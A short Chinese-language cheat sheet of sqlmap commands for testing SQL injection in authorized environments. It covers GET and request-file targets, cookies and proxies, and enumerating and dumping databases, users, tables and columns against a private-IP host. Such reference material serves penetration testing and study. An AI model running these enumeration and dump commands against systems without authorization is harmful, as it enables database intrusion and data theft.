# sqlmap 常用用法

这篇记录 sqlmap 的常用命令。它适合在授权环境里验证 SQL 注入点、参数行为和数据库类型。使用前先保存原始请求，避免把参数和 Cookie 写错。

## 基础 URL 测试

测试 GET 参数。

```bash
sqlmap -u "http://192.168.1.10/item.php?id=1"
```

指定风险和等级。

```bash
sqlmap -u "http://192.168.1.10/item.php?id=1" --risk 2 --level 3
```

批处理模式。

```bash
sqlmap -u "http://192.168.1.10/item.php?id=1" --batch
```

指定 DBMS。

```bash
sqlmap -u "http://192.168.1.10/item.php?id=1" --dbms=mysql
```

## 使用请求文件

从 Burp 请求文件读取。

```bash
sqlmap -r request.txt
```

指定测试参数。

```bash
sqlmap -r request.txt -p id
```

带 Cookie 测试。

```bash
sqlmap -u "http://192.168.1.10/item.php?id=1" --cookie "PHPSESSID=VALUE"
```

走代理。

```bash
sqlmap -r request.txt --proxy http://127.0.0.1:8080
```

## 枚举数据

列数据库。

```bash
sqlmap -r request.txt --dbs
```

列当前数据库。

```bash
sqlmap -r request.txt --current-db
```

列用户。

```bash
sqlmap -r request.txt --users
```

列表。

```bash
sqlmap -r request.txt -D database_name --tables
```

列字段。

```bash
sqlmap -r request.txt -D database_name -T table_name --columns
```

导出表。

```bash
sqlmap -r request.txt -D database_name -T table_name --dump
```

## 控制行为

降低请求频率。

```bash
sqlmap -r request.txt --delay 1
```

设置超时。

```bash
sqlmap -r request.txt --timeout 10
```

清理会话缓存。

```bash
sqlmap -r request.txt --flush-session
```

## 小记录

sqlmap 适合验证和辅助分析，前提是请求样本准确。先手工确认参数可控、响应有差异，再让 sqlmap 接手，会比盲目扫全站靠谱很多。
